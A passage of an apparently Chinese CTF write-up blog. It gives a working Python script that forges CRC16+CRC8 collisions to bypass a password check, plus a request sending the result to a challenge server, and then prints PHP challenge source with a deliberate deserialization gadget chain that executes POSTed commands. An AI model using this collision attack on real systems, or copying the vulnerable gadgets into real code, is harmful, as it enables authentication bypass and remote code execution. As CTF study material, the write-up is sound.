class="number">0xD4</span>,</span><br><span class="line">    <span class="number">0x69</span>, <span class="number">0x6E</span>, <span class="number">0x67</span>, <span class="number">0x60</span>, <span class="number">0x75</span>, <span class="number">0x72</span>, <span class="number">0x7B</span>, <span class="number">0x7C</span>, <span class="number">0x51</span>, <span class="number">0x56</span>, <span class="number">0x5F</span>, <span class="number">0x58</span>, <span class="number">0x4D</span>, <span class="number">0x4A</span>, <span class="number">0x43</span>, <span class="number">0x44</span>,</span><br><span class="line">    <span class="number">0x19</span>, <span class="number">0x1E</span>, <span class="number">0x17</span>, <span class="number">0x10</span>, <span class="number">0x05</span>, <span class="number">0x02</span>, <span class="number">0x0B</span>, <span class="number">0x0C</span>, <span class="number">0x21</span>, <span class="number">0x26</span>, <span class="number">0x2F</span>, <span class="number">0x28</span>, <span class="number">0x3D</span>, <span class="number">0x3A</span>, <span class="number">0x33</span>, <span class="number">0x34</span>,</span><br><span class="line">    <span class="number">0x4E</span>, <span class="number">0x49</span>, <span class="number">0x40</span>, <span class="number">0x47</span>, <span class="number">0x52</span>, <span class="number">0x55</span>, <span class="number">0x5C</span>, <span class="number">0x5B</span>, <span class="number">0x76</span>, <span class="number">0x71</span>, <span class="number">0x78</span>, <span class="number">0x7F</span>, <span class="number">0x6A</span>, <span class="number">0x6D</span>, <span class="number">0x64</span>, <span class="number">0x63</span>,</span><br><span class="line">    <span class="number">0x3E</span>, <span class="number">0x39</span>, <span class="number">0x30</span>, <span class="number">0x37</span>, <span class="number">0x22</span>, <span class="number">0x25</span>, <span class="number">0x2C</span>, <span class="number">0x2B</span>, <span class="number">0x06</span>, <span class="number">0x01</span>, <span class="number">0x08</span>, <span class="number">0x0F</span>, <span class="number">0x1A</span>, <span class="number">0x1D</span>, <span class="number">0x14</span>, <span class="number">0x13</span>,</span><br><span class="line">    <span class="number">0xAE</span>, <span class="number">0xA9</span>, <span class="number">0xA0</span>, <span class="number">0xA7</span>, <span class="number">0xB2</span>, <span class="number">0xB5</span>, <span class="number">0xBC</span>, <span class="number">0xBB</span>, <span class="number">0x96</span>, <span class="number">0x91</span>, <span class="number">0x98</span>, <span class="number">0x9F</span>, <span class="number">0x8A</span>, <span class="number">0x8D</span>, <span class="number">0x84</span>, <span class="number">0x83</span>,</span><br><span class="line">    <span class="number">0xDE</span>, <span class="number">0xD9</span>, <span class="number">0xD0</span>, <span class="number">0xD7</span>, <span class="number">0xC2</span>, <span class="number">0xC5</span>, <span class="number">0xCC</span>, <span class="number">0xCB</span>, <span class="number">0xE6</span>, <span class="number">0xE1</span>, <span class="number">0xE8</span>, <span class="number">0xEF</span>, <span class="number">0xFA</span>, <span class="number">0xFD</span>, <span class="number">0xF4</span>, <span class="number">0xF3</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compute_crc8</span>(<span class="params">data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    crc = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> data:</span><br><span class="line">        crc = crc8_table[(crc ^ b) &amp; <span class="number">0xff</span>]</span><br><span class="line">    <span class="keyword">return</span> crc &amp; <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crc24</span>(<span class="params">data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> (compute_crc16(data) &lt;&lt; <span class="number">8</span>) | compute_crc8(data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ---- GF(2) basis solver to express target diff as XOR of columns ----</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_columns_for_positions</span>(<span class="params">base: <span class="built_in">bytes</span>, positions: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    For each (position, bit) produce a 24-bit column representing effect on crc24 when toggling that bit.</span></span><br><span class="line"><span class="string">    The order is for each position in positions (in order) and for bit 0..7 within each position.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    columns = []</span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> positions:</span><br><span class="line">        <span class="keyword">for</span> bit <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            b = <span class="built_in">bytearray</span>(base)</span><br><span class="line">            b[pos] ^= (<span class="number">1</span> &lt;&lt; bit)</span><br><span class="line">            eff = crc24(<span class="built_in">bytes</span>(b)) ^ crc24(base)</span><br><span class="line">            columns.append(eff)</span><br><span class="line">    <span class="keyword">return</span> columns</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">try_solve_with_columns</span>(<span class="params">columns: <span class="type">List</span>[<span class="built_in">int</span>], target_diff: <span class="built_in">int</span></span>) -&gt; <span class="type">Optional</span>[<span class="built_in">int</span>]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Given columns (list of 24-bit ints) and target_diff (24-bit int),</span></span><br><span class="line"><span class="string">    try to represent target_diff as XOR of some columns.</span></span><br><span class="line"><span class="string">    If possible, return an integer mask where bit j means use columns[j].</span></span><br><span class="line"><span class="string">    Otherwise return None.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># basis indexed by bit position 0..23 (we&#x27;ll store highest-bit-first reduction)</span></span><br><span class="line">    BASIS_BITS = <span class="number">24</span></span><br><span class="line">    basis = [<span class="number">0</span>] * BASIS_BITS      <span class="comment"># basis vector value for that leading bit</span></span><br><span class="line">    <span class="comment"># representation mask (which columns XOR to produce basis vector)</span></span><br><span class="line">    basis_repr = [<span class="number">0</span>] * BASIS_BITS</span><br><span class="line">    <span class="keyword">for</span> j, col <span class="keyword">in</span> <span class="built_in">enumerate</span>(columns):</span><br><span class="line">        v = col</span><br><span class="line">        repr_mask = <span class="number">1</span> &lt;&lt; j</span><br><span class="line">        <span class="comment"># reduce using current basis</span></span><br><span class="line">        <span class="keyword">for</span> bit <span class="keyword">in</span> <span class="built_in">reversed</span>(<span class="built_in">range</span>(BASIS_BITS)):</span><br><span class="line">            <span class="keyword">if</span> (v &gt;&gt; bit) &amp; <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">if</span> basis[bit] != <span class="number">0</span>:</span><br><span class="line">                    v ^= basis[bit]</span><br><span class="line">                    repr_mask ^= basis_repr[bit]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    basis[bit] = v</span><br><span class="line">                    basis_repr[bit] = repr_mask</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># now try to reduce target_diff</span></span><br><span class="line">    v = target_diff</span><br><span class="line">    <span class="built_in">repr</span> = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> <span class="built_in">reversed</span>(<span class="built_in">range</span>(BASIS_BITS)):</span><br><span class="line">        <span class="keyword">if</span> (v &gt;&gt; bit) &amp; <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">if</span> basis[bit] == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span>  <span class="comment"># cannot represent</span></span><br><span class="line">            v ^= basis[bit]</span><br><span class="line">            <span class="built_in">repr</span> ^= basis_repr[bit]</span><br><span class="line">    <span class="keyword">if</span> v == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">repr</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_candidate_from_mask</span>(<span class="params">base: <span class="built_in">bytes</span>, positions: <span class="type">List</span>[<span class="built_in">int</span>], mask: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    L = <span class="built_in">len</span>(base)</span><br><span class="line">    delta = <span class="built_in">bytearray</span>(L)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(positions) * <span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> (mask &gt;&gt; j) &amp; <span class="number">1</span>:</span><br><span class="line">            pos_idx = j // <span class="number">8</span></span><br><span class="line">            bit_idx = j % <span class="number">8</span></span><br><span class="line">            pos = positions[pos_idx]</span><br><span class="line">            delta[pos] ^= (<span class="number">1</span> &lt;&lt; bit_idx)</span><br><span class="line">    candidate = <span class="built_in">bytearray</span>(base)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(L):</span><br><span class="line">        candidate[i] ^= delta[i]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(candidate)</span><br><span class="line"></span><br><span class="line"><span class="comment"># --- High-level search routine ---</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_collision</span>(<span class="params">secret: <span class="built_in">bytes</span>, k: <span class="built_in">int</span> = <span class="number">3</span>, tries_per_positions_set: <span class="built_in">int</span> = <span class="number">1000</span>, seed: <span class="type">Optional</span>[<span class="built_in">int</span>] = <span class="literal">None</span>, position_sets: <span class="type">Optional</span>[<span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]] = <span class="literal">None</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    secret: bytes (the true password)</span></span><br><span class="line"><span class="string">    k: number of bytes that may be toggled (choose positions set size k)</span></span><br><span class="line"><span class="string">    tries_per_positions_set: for each chosen set of positions, try this many random base messages</span></span><br><span class="line"><span class="string">    position_sets: optional explicit list of position lists to try; otherwise we try a few heuristics + random sets</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    random.seed(seed)</span><br><span class="line">    L = <span class="built_in">len</span>(secret)</span><br><span class="line">    target_crc24 = crc24(secret)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># produce default position sets if not provided</span></span><br><span class="line">    <span class="keyword">if</span> position_sets <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        pos_sets = []</span><br><span class="line">        <span class="comment"># try last k bytes, first k bytes, a middle mix</span></span><br><span class="line">        <span class="keyword">if</span> L &gt;= k:</span><br><span class="line">            pos_sets.append(<span class="built_in">list</span>(<span class="built_in">range</span>(L-k, L)))</span><br><span class="line">            pos_sets.append(<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">0</span>, k)))</span><br><span class="line">            pos_sets.append(<span class="built_in">sorted</span>(random.sample(<span class="built_in">range</span>(L), k)))</span><br><span class="line">        <span class="comment"># add several random sets</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">            pos_sets.append(<span class="built_in">sorted</span>(random.sample(<span class="built_in">range</span>(L), k)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        pos_sets = position_sets</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> positions <span class="keyword">in</span> pos_sets:</span><br><span class="line">        <span class="comment"># prepare columns template for a base; columns depend on base, so must recompute per base</span></span><br><span class="line">        <span class="keyword">for</span> attempt <span class="keyword">in</span> <span class="built_in">range</span>(tries_per_positions_set):</span><br><span class="line">            <span class="comment"># pick a random base that is *not* the secret (we can also use the secret itself but that often gives trivial zero-diff)</span></span><br><span class="line">            base = <span class="built_in">bytearray</span>(secret)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(L):</span><br><span class="line">                base[i] = random.randrange(<span class="number">256</span>)</span><br><span class="line">            base = <span class="built_in">bytes</span>(base)</span><br><span class="line">            columns = build_columns_for_positions(base, positions)</span><br><span class="line">            d = crc24(base) ^ target_crc24</span><br><span class="line">            mask = try_solve_with_columns(columns, d)</span><br><span class="line">            <span class="keyword">if</span> mask <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                candidate = build_candidate_from_mask(base, positions, mask)</span><br><span class="line">                <span class="keyword">if</span> candidate != secret <span class="keyword">and</span> crc24(candidate) == target_crc24:</span><br><span class="line">                    <span class="keyword">return</span> &#123;</span><br><span class="line">                        <span class="string">&quot;secret&quot;</span>: secret,</span><br><span class="line">                        <span class="string">&quot;candidate&quot;</span>: candidate,</span><br><span class="line">                        <span class="string">&quot;positions&quot;</span>: positions,</span><br><span class="line">                        <span class="string">&quot;base&quot;</span>: base,</span><br><span class="line">                        <span class="string">&quot;mask&quot;</span>: mask</span><br><span class="line">                    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Helper to pretty-print bytes</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">as_hex</span>(<span class="params">b: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> b.<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_printable</span>(<span class="params">b: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = b.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">all</span>(<span class="number">0x20</span> &lt;= c &lt; <span class="number">0x7f</span> <span class="keyword">for</span> c <span class="keyword">in</span> b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    p = argparse.ArgumentParser(</span><br><span class="line">        description=<span class="string">&quot;Find a different message with same CRC16+CRC8 as secret (same length).&quot;</span>)</span><br><span class="line">    p.add_argument(<span class="string">&quot;--secret&quot;</span>, required=<span class="literal">True</span>,</span><br><span class="line">                   <span class="built_in">help</span>=<span class="string">&quot;the secret string (exact bytes).&quot;</span>)</span><br><span class="line">    p.add_argument(<span class="string">&quot;--k&quot;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">3</span>,</span><br><span class="line">                   <span class="built_in">help</span>=<span class="string">&quot;number of byte positions to allow flipping (default 3).&quot;</span>)</span><br><span class="line">    p.add_argument(<span class="string">&quot;--tries&quot;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">2000</span>,</span><br><span class="line">                   <span class="built_in">help</span>=<span class="string">&quot;random bases to try per positions set.&quot;</span>)</span><br><span class="line">    p.add_argument(<span class="string">&quot;--seed&quot;</span>, <span class="built_in">type</span>=<span class="keyword">lambda</span> s: <span class="built_in">int</span>(s, <span class="number">0</span>), default=<span class="number">0x414141</span>,</span><br><span class="line">                   <span class="built_in">help</span>=<span class="string">&quot;random seed (accepts decimal or hex, e.g. 0x414141).&quot;</span>)</span><br><span class="line">    args = p.parse_args()</span><br><span class="line"></span><br><span class="line">    secret = args.secret.encode(<span class="string">&#x27;latin1&#x27;</span>)  <span class="comment"># allow raw bytes via latin1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Secret:&quot;</span>, secret)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Secret hex:&quot;</span>, as_hex(secret))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Secret CRC16=0x%04x, CRC8=0x%02x, combined=0x%06x&quot;</span> %</span><br><span class="line">          (compute_crc16(secret), compute_crc8(secret), crc24(secret)))</span><br><span class="line">    result = find_collision(</span><br><span class="line">        secret, k=args.k, tries_per_positions_set=args.tries, seed=args.seed)</span><br><span class="line">    <span class="keyword">if</span> result <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;No collision found. Try increasing k or the number of tries, or provide specific position sets.&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span></span><br><span class="line">    cand = result[<span class="string">&quot;candidate&quot;</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Found candidate:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot; Candidate bytes repr:&quot;</span>, cand)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot; Candidate hex:&quot;</span>, as_hex(cand))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot; Candidate CRC16=0x%04x, CRC8=0x%02x&quot;</span> %</span><br><span class="line">          (compute_crc16(cand), compute_crc8(cand)))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot; Positions used:&quot;</span>, result[<span class="string">&quot;positions&quot;</span>])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot; Base used:&quot;</span>, as_hex(result[<span class="string">&quot;base&quot;</span>]))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot; Printable?:&quot;</span>, is_printable(cand))</span><br><span class="line">    <span class="comment"># If printable is desired but candidate not printable, user can try different settings or try small brute force on chosen positions.</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    sys.exit(main())</span><br></pre></td></tr></table></figure><p><code>exp.py --secret &quot;Enj0yNSSCTF4th!&quot; --k 3 --tries 2000 --seed 0x414141</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">candidate = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;2619576310042a5bbf7c24dfa47780&quot;</span>)</span><br><span class="line">r = requests.post(<span class="string">&quot;http://node9.anna.nssctf.cn:29070/&quot;</span>,</span><br><span class="line">                  data=&#123;<span class="string">&quot;pass&quot;</span>: candidate&#125;)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><h2 id="mpga-filesystem"><a href="#mpga-filesystem" class="headerlink" title="[mpga]filesystem"></a>[mpga]filesystem</h2><p>题目有源码，可以直接下载</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ApplicationContext</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$contextName</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;contextName = <span class="string">&#x27;ApplicationContext&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;contextName = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$this</span>-&gt;contextName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ContentProcessor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$processedContent</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$callbackFunction</span>;   </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;processedContent = <span class="keyword">new</span> <span class="title class_">FunctionInvoker</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">property_exists</span>(<span class="variable">$this</span>, <span class="variable">$key</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_object</span>(<span class="variable">$this</span>-&gt;<span class="variable">$key</span>) &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$this</span>-&gt;callbackFunction)) &#123;</span><br><span class="line">                </span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="variable">$key</span>-&gt;&#123;<span class="variable language_">$this</span>-&gt;callbackFunction&#125;(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileManager</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$targetFile</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$responseData</span> = <span class="string">&#x27;default_response&#x27;</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$targetFile</span> = <span class="literal">null</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;targetFile = <span class="variable">$targetFile</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filterPath</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\/|php:|data|zip|\.\.\//i&#x27;</span>,<span class="variable">$this</span>-&gt;targetFile))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;文件路径不符合规范&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">performWriteOperation</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123; </span><br><span class="line">        </span><br><span class="line">        <span class="variable">$targetObject</span> = <span class="variable language_">$this</span>-&gt;targetFile; </span><br><span class="line">        <span class="variable">$value</span> = <span class="variable">$targetObject</span>-&gt;<span class="variable">$var</span>; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFileHash</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">filterPath</span>(); </span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$this</span>-&gt;targetFile)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;targetFile)) &#123;</span><br><span class="line">                <span class="variable">$md5_hash</span> = <span class="title function_ invoke__">md5_file</span>(<span class="variable">$this</span>-&gt;targetFile);</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;文件MD5哈希: &quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$md5_hash</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;文件未找到&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">is_object</span>(<span class="variable">$this</span>-&gt;targetFile)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                </span><br><span class="line">                <span class="variable">$md5_hash</span> = <span class="title function_ invoke__">md5_file</span>(<span class="variable">$this</span>-&gt;targetFile);</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;文件MD5哈希 (尝试): &quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$md5_hash</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (<span class="built_in">TypeError</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">                </span><br><span class="line">                </span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;无法计算MD5哈希，因为文件参数无效: &quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;文件未找到&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;method&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">method_exists</span>(<span class="variable">$this</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;method&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$method</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;method&#x27;</span>];</span><br><span class="line">            <span class="variable">$var</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;var&#x27;</span>]) ? <span class="variable">$_POST</span>[<span class="string">&#x27;var&#x27;</span>] : <span class="literal">null</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="variable">$method</span>(<span class="variable">$var</span>); </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;responseData;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FunctionInvoker</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$functionName</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$functionArguments</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">function_exists</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">            <span class="variable">$name</span>(<span class="variable">$arg</span>[<span class="number">0</span>]); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$action</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>] : <span class="string">&#x27;home&#x27;</span>;</span><br><span class="line"><span class="variable">$output</span> = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line"><span class="variable">$upload_dir</span> = <span class="string">&quot;upload/&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$upload_dir</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$upload_dir</span>, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$action</span> === <span class="string">&#x27;upload_file&#x27;</span>) &#123; </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>]) &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>] == UPLOAD_ERR_OK) &#123;</span><br><span class="line">            <span class="variable">$allowed_extensions</span> = [<span class="string">&#x27;txt&#x27;</span>, <span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>, <span class="string">&#x27;jpg&#x27;</span>];</span><br><span class="line">            <span class="variable">$file_info</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">            <span class="variable">$file_extension</span> = <span class="title function_ invoke__">strtolower</span>(<span class="keyword">isset</span>(<span class="variable">$file_info</span>[<span class="string">&#x27;extension&#x27;</span>]) ? <span class="variable">$file_info</span>[<span class="string">&#x27;extension&#x27;</span>] : <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_extension</span>, <span class="variable">$allowed_extensions</span>)) &#123;</span><br><span class="line">                <span class="variable">$output</span> = <span class="string">&quot;&lt;p class=&#x27;text-red-600&#x27;&gt;不允许的文件类型。只允许 txt, png, gif, jpg。&lt;/p&gt;&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                </span><br><span class="line">                <span class="variable">$unique_filename</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">time</span>() . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span 